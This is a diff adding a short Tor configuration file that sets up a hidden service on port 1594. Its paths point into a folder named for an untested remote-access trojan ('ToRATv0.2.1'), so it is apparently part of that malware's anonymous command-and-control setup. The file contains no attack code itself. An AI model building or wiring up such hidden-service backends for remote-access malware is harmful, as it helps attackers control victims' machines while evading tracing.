@@ -1,0 +1,6 @@
+DataDirectory C:\Users\KaseFuss\Desktop\RAT's\Untested\ToRATv0.2.1 rikanono\System\Tor\TorData
+HiddenServiceDir C:\Users\KaseFuss\Desktop\RAT's\Untested\ToRATv0.2.1 rikanono\System\Tor\Hidden_Service
+HiddenServicePort 1594 127.0.0.1:1594
+SocksListenAddress 127.0.0.1
+SocksPort 9050
+PidFile C:\Users\KaseFuss\Desktop\RAT's\Untested\ToRATv0.2.1 rikanono\System\Tor\TorData\Tor.pid
